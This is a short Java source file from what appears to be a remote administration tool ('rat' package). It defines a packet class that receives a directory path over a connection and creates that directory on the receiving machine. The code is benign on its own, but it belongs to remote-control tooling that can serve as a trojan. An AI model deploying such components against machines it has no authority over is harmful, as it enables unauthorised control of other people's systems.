/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.packet;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;

public final class NewDirectoryPacket implements IPacket {
	
	private String path;
	
	public NewDirectoryPacket(final String path) {
		this.path = path;
	}
	
	public NewDirectoryPacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUtf(path);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		path = connection.readUtf();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		FileUtils.createDirectory(path);
	}
	
	public String getPath() {
		return path;
	}
	
}
